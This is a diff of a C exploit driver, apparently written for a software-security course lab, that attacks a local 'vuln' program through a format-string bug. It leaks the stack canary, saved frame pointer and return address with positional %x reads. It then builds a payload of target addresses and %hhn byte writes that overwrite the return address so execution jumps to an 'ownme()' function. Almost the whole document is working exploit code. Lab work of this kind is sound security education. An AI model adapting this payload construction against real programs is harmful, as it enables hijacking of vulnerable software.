@@ -29,18 +29,16 @@ char buf[1<<20];
 unsigned end;
 int from_child, to_child;
 
+// Beautified print_escaped: print first two character then, gather by 4 bytes
 void print_escaped(FILE *fp, const char* buf, unsigned len) {
    int i;
    int l=-3;
+   fprintf(stderr, "\n%4d:", 0); // empty line
    for (i=0; i < len; i++) {
-  //    if (isprint(buf[i]))
-    //     fputc(buf[i], stderr);
-     // else fprintf(stderr, "\\x%02hhx", buf[i]);
-	if(i%4==0 && i%16==0)
-		fprintf(stderr, "\n%4d:", l+=4);
-	else if(i%4==0)
-		fprintf(stderr, " ");
-
+      if(i%4==2 && i%16==2)
+         fprintf(stderr, "\n%4d:", l+=4);
+      else if(i%4==2)
+         fprintf(stderr, " ");
       fprintf(stderr, "\\x%02hhx", buf[i]);
    }
 }
@@ -112,79 +110,56 @@ void create_subproc(const char* exec, char* argv[]) {
    }
 }
 
-char* writeByte(char* at, short val, int takeNth){
-   // returns "%[val]d%[takeNth]hhn%[pad]d"
-   // invariant: %hhn is 0x00
-   char* ret = at;
-   short saved_val = val;
+int digits(int N);
+char *ntos(char* at, unsigned int write);
+/** 
+ * Params: 
+ *    at            : where to start writing "%[num]d%[deref_arg_num]$hhn%[pad]d"
+ *    num           : num in "%[num]d%[deref_arg_num]$hhn%[pad]d"
+ *    deref_arg_num : arg to derefernce before writing "num" on to stack
+ *                    i.e., location of address space of where the address to be dereferenced is located
+ *                    Unit is in # of words, regarding the location of format string for printf as 0
+ * Return:
+ *    char * to end of appended string "%[num]d%[deref_arg_num]$hhn%[pad]d"
+ */
+char* writeByte(char* at, short num, int deref_arg_num){
+   // returns "%[num]d%[deref_arg_num]$hhn%[pad]d"
+   // invariant: %hhn is 0x00 before printing %[num]d
+   // Note. 
 
-   // part 1: %[val]d
-   int n = 0;
-   val += 0x100;
-   int tmp = val;
+   char* start = at;
 
+   // part 1: %[num]d
+   num += 0x100; 
+   // num has to be at least digits(MAX_INT)+1
+   // + 1: possible negative sign
    *at++ = '%';
-   do {
-      n++;
-      tmp/=10;
-   } while(tmp >= 1); // find the length of val
-
-   at+=n; // move the pointer by n 
-   while(val >= 1){
-       *--at = (val % 10) + '0';
-       val /= 10;
-   }
-   at+=(n); // move to the end of the pointer
+   at = ntos(at, num);
    *at++ = 'd';
 
-   // part 2: %hhn
-   n = 0;
-   tmp = takeNth;
+   // part 2: %[deref_arg_num]$hhn
    *at++ = '%';
-   do {
-      n++;
-      tmp/=10;
-   } while(tmp >= 1); // find the length of val
-
-   at+=n; // move the pointer by n 
-   while(takeNth >= 1){
-       *--at = (takeNth % 10) + '0';
-       takeNth /= 10;
-   }
-   at+=(n); // move to the end of the pointer
-
+   at = ntos(at, deref_arg_num);
    *at++ = '$';
    *at++ = 'h';
    *at++ = 'h';
    *at++ = 'n';
 
    // part 3: %[pad]d
-   n = 0;
-   int val2 = 0x100 - saved_val + 0x100;
-   tmp = val2;
-  
+   int pad = 0x100 - num + 0x100; 
+   // pad has to be at least digits(MAX_INT)+1 and (pad + num) must be divisible by 0x100
+
    *at++ = '%';
-   do {
-      n++;
-      tmp/=10; 
-   } while(tmp >= 1); // find the length of val
- 
-   at+=n; // move the pointer by n
-   while(val2 >= 1){
-       *--at = (val2 % 10) + '0'; // write digit startinf from the least significant digit
-       fprintf(stderr, "writing at %p: %c\n", at+1, (val2 %10) + '0');
-       val2 /= 10;
-   }
-   at+=n;
+   at = ntos(at, pad);
    *at++='d';
    *at = '\0';
 
-   fprintf(stderr, "writeByte(%p, 0x%x, %d) = %s\n", ret, val, takeNth, ret);
+   fprintf(stderr, "writeByte(%p, 0x%x, %d) = %s\n", start, num, deref_arg_num, start);
 
    return at--;
 }
 
-unsigned short digits(int N){
+int digits(int N){
    int ret = 0;
    do{
       ret++;
@@ -193,7 +168,17 @@ unsigned short digits(int N){
    return ret;
 }
 
-
+// number to string
+char *ntos(char* at, unsigned int write){
+   int n = digits(write);
+   at+=n;
+   while(write >= 1){
+      *--at = (write % 10) + '0';
+      write /= 10;
+   }
+   at+=n;
+   return at;
+}
 
 /* Shows an example session with subprocess. Change it as you see fit, */
 
@@ -201,8 +186,6 @@ unsigned short digits(int N){
 #define STRINGIFY(X) STRINGIFY2(X)
 
 int main(int argc, char* argv[]) {
-   unsigned seed;
-
    char *nargv[3];
    nargv[0] = "vuln";
    nargv[1] = STRINGIFY(GRP);
@@ -215,122 +198,94 @@ int main(int argc, char* argv[]) {
 
    getchar();
 
-   void *auth_user = 0xbfffe6f0;   // value of user variable in auth
-   void *auth_canary_loc = 0xbfffe88c; // location where auth's canary is stored
-   void *auth_bp_loc = 0xbfffe898; // location of auth's saved bp
-   void *auth_ra_loc = 0xbfffe89c; // location of auth's return address
-
-   void *main_loop2_ebp_loc = 0xbfffefa8; // location of main_loop's ebp from run #2
-   void *main_loop2_ebp = 0xbfffefd8; // value of main_loop's ebp from run #2
-   void *auth_user2 = 0xbfffe700; // value of user variable in auth from run #2
-   void *auth_user2_loc = 0xbfffe894; // user variable location from run #2
-   void *auth_pass2_loc = 0xbfffe888; // pass variable location from run #2
-   void *auth_l2_loc = 0xbfffe898; // l variable location from run #2
-   void *auth_ebp2 = 0xbfffe8a8; // value of auth's ebp from run #2
-
-
-   unsigned int auth_user_auth_ra_loc_diff = auth_ra_loc - auth_user;
-   unsigned int auth_user_auth_canary_loc_diff = auth_canary_loc - auth_user;
-
-   unsigned int offset_auth_user2_loc = auth_user2_loc - auth_user2;
-   unsigned int offset_auth_pass2_loc = auth_pass2_loc - auth_user2;
-   unsigned int offset_auth_l2_loc = auth_l2_loc - auth_user2;
+   void *main_loop2_ebp_loc =(void*) 0xbfffefa8; // location of main_loop's ebp from run #2
+   void *main_loop2_ebp =(void*) 0xbfffefd8; // value of main_loop's ebp from run #2
+   void *auth_user2 = (void*)0xbfffe700; // value of user variable in auth from run #2
 
    // this is the offset where the address of jmp to will happen
    unsigned int offset_auth_user_main_loop_bp = main_loop2_ebp - auth_user2;
    fprintf(stderr, "dirver: Expected offset of auth_user from main_loop2 ebp: %d\n", offset_auth_user_main_loop_bp);
 
-   unsigned int offset_auth_ebp = auth_ebp2 - auth_user2;
-
    unsigned int offset_main_loop_ebp_ebploc = main_loop2_ebp - main_loop2_ebp_loc;
 
-   // exploit idea
-   // 1. Extract values
-   // 2. Calculate the RA's location
-   // 3. Append that into the format string to attack
-   //    e.g., e   ADDR%Nd%M$n
-   // where N is number of junk bytes to print and M is the M's stack pointer
-   // failed: printf cannot output that many 
-  
-   // 3. e %g...%g[%x maybe]%[pad]d%[val]d%hhn 
+   /* Exploit idea
+    * 1. Extract values
+    * 2. Calculate the RA's location
+    * 3. Append that into the format string to attack
+    *    e.g., e   ADDR%Nd%M$hhn%Ld
+    * where N is number of junk bytes to print,
+    *       M is the relative location of ADDR in # of words relative to format string argument
+    *       L is the # of padding characters to print out
+    *
+    * Note. N and L has to be at least digits(MAX_INT)+1, 
+    *       because if this value is larger than N or L, 
+    *       there will be more characters printed than N or L.
+   */
 
-   // 1. Extract main_loop()'s address
+   // Detailed steps
+   // 1. Extract runtime information
    put_str("e %431$x %434$x %435$x\n"); // returns the adderss of main_loop()
    send();
 
    void *main_loop_ra, *main_loop_bp, *canary; // address of main_loop's return address
    get_formatted("%x%x%x", &canary, &main_loop_bp, &main_loop_ra); 
-   fprintf(stderr, "driver: Extracted canary: %x temp ebp: %x main_loop_ra: %x\n", canary, main_loop_bp, main_loop_ra);
+   fprintf(stderr, "driver: Extracted canary: %x main_loop_bp: %x main_loop_ra: %x\n", 
+      (unsigned int) canary, 
+      (unsigned int) main_loop_bp, 
+      (unsigned int) main_loop_ra);
 
-   // 2. Find address of ownme()
+   // 2. Calculate necessary values 
+   // 2-1. Find address of ownme()
    int offset_main_loop_ra_and_ownme = 1141; // offset from return address to ownme
    void *ownme_addr= (void*)((int)main_loop_ra-offset_main_loop_ra_and_ownme);
    fprintf(stderr, "driver: ownme_addr is %p\n", ownme_addr);
 
-   // 2-1. Find addresss of RA location
+   // 2-2. Find addresss of RA location
    void *ra_loc = main_loop_bp - offset_main_loop_ebp_ebploc + 0x4;
    fprintf(stderr, "driver: ra_loc is %p\n", ra_loc);
 
-   // 3. Prepare the exploit
-   
-   // 3-1.
+   // 3. Exploit
+   // 3-1. Prepare the payload
    unsigned explsz = 400;
 
-   char *expl = (char**)malloc(explsz);
+   char *expl = (char*) malloc(explsz);
    memset((void*)expl, 'P', explsz);
 
    fprintf(stderr, "driver: exploit size: %d\n", explsz);
 
-   expl[0] = 'e';
-   expl[1] = ' ';
-   expl[2] = ' ';
-   expl[3] = ' ';
-
-   // Now initialize the parts of the exploit buffer that really matter. Note
-   // that we don't have to worry about endianness as long as the exploit is
-   // being assembled on the same architecture/OS as the process being
-   // exploited.
-   ((void**)expl)[1] = ((char*)ra_loc);
-   ((void**)expl)[2] = ((char*)ra_loc) + 1;
-   ((void**)expl)[3] = ((char*)ra_loc) + 2;
-   ((void**)expl)[4] = ((char*)ra_loc) + 3;
-   
-   char *c_expl = ((char*) expl) + 4 * 5;
-   *c_expl++ = '\0';
-   fprintf(stderr, "driver: mid way exploit: %s\n", expl);
-   *(--c_expl) = 'P';
-
-   int toWrite = (int)ownme_addr;
-   int soFar = 20;
-
-   c_expl += (0x100 - 18);
-
+   // 3-2. Write byte address locations in the first 16 bytes
    for(int i = 0; i < 4; i++){
-      short byte = toWrite % 0x100;
-      fprintf(stderr, "driver: toWrite=0x%x, byte=0x%x\n", toWrite, byte);
-      c_expl = writeByte(c_expl, byte, i+89);
-      toWrite /= 0x100;
+      ((void**)expl)[i] = ((char*)ra_loc) + i;
    }
-   
-   //int toWrite = (int) ownme_addr;
-   //c_expl += d; // shift d # of bytes
-   //while(toWrite >= 1){
-   //     *--c_expl = (toWrite % 10) + '0';
-   //    toWrite /= 10;
-   //}
-   //c_expl+=(d); // move to the end of the pointer
-   //*c_expl++='d';
 
-   // Now, we have 'e   %Nd'
+   // 3-3. Prepare string that overwrite the RA
 
-   *c_expl++='\0';
-   
-   fprintf(stderr, "driver: Prepared exploit: %s\n", expl);
+   // 3-3-1. Decide where in payload to start writing
+   // pad the byte address location, so that when writeByte() is called, %hhn is 0x00
+   char *expl_ptr = ((char*) expl) + 4 * 4 + (0x100 - 18); 
+   // + 4 * 4: for 4 address each 4 bytes
+   // + 0x100: need to have %hhn be 00
+   // - 18   : what has been printed so far
+   //          Note. because in vuln.c, it prints from rdbuf[2], it is 18 and not 20.
+
+   // 3-3-2. Write "%[val]d%[takeNth]$hhn%[pad]d" on to the payload
+   int toWrite = (int)ownme_addr; // to preserve ownme_addr, just in case
+   for(int i = 0; i < 4; i++){
+      short byte = toWrite % 0x100; // byte to be written, i.e., the [val] part
+
+      expl_ptr = writeByte(expl_ptr, byte, i + 89);
+      // Note. 89 because, the rdbuf[1] is 89th parameter 
+      //       from the format string location on the stack
+
+      toWrite /= 0x100; // to get the next byte
+   }
 
    // 4. Now, send the payload
-   put_bin((char*)expl, explsz);
+   put_str("e   ");
+   put_bin((char*)expl, explsz);          
    put_str("\n");
    send();
+   fprintf(stderr, "driver: payload sent, debug now to check if the RA has successfully overwritten.\n");
    getchar();
 
    put_str("q \n");
@@ -339,7 +294,7 @@ int main(int argc, char* argv[]) {
    usleep(100000);
    get_formatted("%*s");
 
-   //kill(pid, SIGINT);
+   kill(pid, SIGINT);
    int status;
    wait(&status);
 
